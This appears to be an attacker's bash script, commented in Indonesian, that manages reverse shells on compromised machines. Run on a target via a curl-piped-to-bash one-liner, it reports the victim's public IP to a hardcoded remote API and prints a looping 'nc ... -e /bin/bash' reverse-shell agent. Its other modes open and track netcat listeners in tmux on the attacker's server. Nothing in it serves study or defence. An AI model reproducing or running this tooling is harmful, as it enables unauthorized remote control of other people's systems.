#!/usr/bin/env bash
#
# =====================================================
#  MANAGER.SH - FINAL 
#    - Mode INSTALL => kirim data ke db_api.php (API)
#      * Jalankan di target: 
#        X="MyKey" bash -c "$(curl -fsSL http://VPS_IP/manager.sh)"
#    - Mode CONNECT, LIST, KILL => akses CSV di server
#      * Sebaiknya jalankan di VPS (ssh root@VPS "S='MyKey' /var/www/html/manager.sh")
# =====================================================

DB_FILE="/var/www/html/multi_reverse_db.csv"
DB_API_URL="http://45.76.182.111/db_api.php"  # Ubah IP sesuai
VPS_IP="45.76.182.111"

###############################################################################
## Fungsi Pembantu
###############################################################################
timestamp_now() {
  date "+%Y-%m-%d %H:%M:%S"
}

init_db() {
  if [ ! -f "$DB_FILE" ]; then
    touch "$DB_FILE"
  fi
}

find_record_by_key() {
  local key="$1"
  [ ! -f "$DB_FILE" ] && return
  grep "^${key}," "$DB_FILE" | tail -n 1
}

get_field() {
  local line="$1"
  local idx="$2"
  echo "$line" | cut -d',' -f "$idx"
}

update_record_field() {
  local key="$1"
  local fieldIndex="$2"
  local newVal="$3"

  [ ! -f "$DB_FILE" ] && return 1

  local tmpFile="${DB_FILE}.tmp"
  awk -F, -v k="$key" -v f="$fieldIndex" -v val="$newVal" 'BEGIN {OFS=","} {
    if ($1 == k) {
      $f = val
    }
    print $0
  }' "$DB_FILE" > "$tmpFile" && mv "$tmpFile" "$DB_FILE"
}

tmux_session_exists() {
  local sName="$1"
  tmux ls 2>/dev/null | grep -q "^${sName}:"
}

###############################################################################
## MODE: INSTALL
###############################################################################
mode_install() {
  local key="$1"
  echo "[INFO] === MODE INSTALL: key=$key ==="

  # 1) Dapatkan IP publik dari host pengeksekusi
  local hostIP
  hostIP="$(curl -s ifconfig.me || echo "UNKNOWN_IP")"

  # 2) Kirim data ke API (db_api.php)
  echo "[INFO] Mengirim POST ke $DB_API_URL => key=$key, ip=$hostIP"
  local resp
  resp="$(curl -s -X POST -d "key=$key" -d "ip=$hostIP" "$DB_API_URL")"
  echo "[DEBUG] API Response => $resp"

  # 3) Ambil "port" (json)
  #    Agar sederhana, kita 'sed' (Jika punya 'jq', lebih baik)
  local port
  port="$(echo "$resp" | sed -n 's/.*"port":\([0-9]*\).*/\1/p')"

  if [ -z "$port" ]; then
    echo "[ERROR] Gagal parse 'port' dari respons API. Mungkin PHP belum jalan atau JSON bermasalah."
    echo "RESP=$resp"
    exit 1
  fi

  echo "[INFO] => Dapat port: $port"

  # [Opsional] Tampilkan agen example
  cat <<EOF
==============================================
Key="$key"
HostIP="$hostIP"
AssignedPort="$port"

Agen Reverse Shell (Contoh):
#!/usr/bin/env bash
while true; do
  sleep 10
  nc ${VPS_IP} ${port} -e /bin/bash
done
==============================================
EOF
}

###############################################################################
## MODE: CONNECT (Buka Listener di VPS)
###############################################################################
mode_connect() {
  local key="$1"
  echo "[INFO] === MODE CONNECT: key=$key ==="

  init_db
  local rec
  rec="$(find_record_by_key "$key")"
  if [ -z "$rec" ]; then
    echo "[ERROR] Key=$key tidak ada di $DB_FILE"
    exit 1
  fi

  local port
  port="$(get_field "$rec" 3)"
  local status
  status="$(get_field "$rec" 4)"
  local pid
  pid="$(get_field "$rec" 5)"

  local sessionName="rs_${key}"
  if tmux_session_exists "$sessionName"; then
    echo "[WARN] tmux session=$sessionName sudah aktif."
    exit 1
  fi

  echo "[INFO] Buka netcat listener => port=$port"
  tmux new -d -s "$sessionName" "nc -lvkp $port"
  update_record_field "$key" 4 "LISTENING"
  update_record_field "$key" 5 "$sessionName"
  echo "[INFO] => Session=$sessionName"
  echo "[INFO] => tmux attach -t $sessionName (untuk lihat shell). Ctrl+B D untuk detach."
}

###############################################################################
## MODE: LIST
###############################################################################
mode_list() {
  echo "[INFO] === MODE LIST ==="
  init_db
  if [ ! -s "$DB_FILE" ]; then
    echo "[INFO] DB kosong: $DB_FILE"
    exit 0
  fi
  cat "$DB_FILE"
}

###############################################################################
## MODE: KILL
###############################################################################
mode_kill() {
  local key="$1"
  echo "[INFO] === MODE KILL: key=$key ==="

  init_db
  local rec
  rec="$(find_record_by_key "$key")"
  if [ -z "$rec" ]; then
    echo "[ERROR] key=$key tidak ada di DB"
    exit 1
  fi

  local status
  status="$(get_field "$rec" 4)"
  local pid
  pid="$(get_field "$rec" 5)"

  if [ "$status" != "LISTENING" ]; then
    echo "[WARN] Status $status, bukan LISTENING."
    exit 0
  fi

  local sessionName="$pid"
  if tmux_session_exists "$sessionName"; then
    echo "[INFO] kill-session => $sessionName"
    tmux kill-session -t "$sessionName"
    update_record_field "$key" 4 "STOPPED"
    update_record_field "$key" 5 "-"
    echo "[INFO] => Sukses menutup listener"
  else
    echo "[WARN] session $sessionName tidak ditemukan. Update status => STOPPED"
    update_record_field "$key" 4 "STOPPED"
    update_record_field "$key" 5 "-"
  fi
}

###############################################################################
## MAIN
###############################################################################
main() {
  if [ -n "$X" ]; then
    mode_install "$X"
  elif [ -n "$S" ]; then
    mode_connect "$S"
  elif [ -n "$LIST" ]; then
    mode_list
  elif [ -n "$K" ]; then
    mode_kill "$K"
  else
    cat <<EOF
Usage:
  # 1) Mode INSTALL (jalankan di target):
     X="SomeKey" bash -c "\$(curl -fsSL http://$VPS_IP/manager.sh)"

  # 2) Mode CONNECT (buka netcat di VPS):
     S="SomeKey" bash -c "\$(curl -fsSL http://$VPS_IP/manager.sh)"
     (Tapi sebaiknya: ssh root@$VPS_IP "S='SomeKey' /var/www/html/manager.sh")

  # 3) Mode LIST:
     LIST=1 bash -c "\$(curl -fsSL http://$VPS_IP/manager.sh)"

  # 4) Mode KILL:
     K="SomeKey" bash -c "\$(curl -fsSL http://$VPS_IP/manager.sh)"

------------------------------------
Catatan Penting:
 - 'INSTALL' menulis data ke multi_reverse_db.csv via API (db_api.php).
 - 'CONNECT/LIST/KILL' membaca file CSV LOKAL DI VPS (/var/www/html/multi_reverse_db.csv).
 - Agar netcat & tmux berjalan di VPS, sebaiknya eksekusi 'CONNECT' / 'KILL' di VPS (via SSH).
EOF
  fi
}

main "$@"
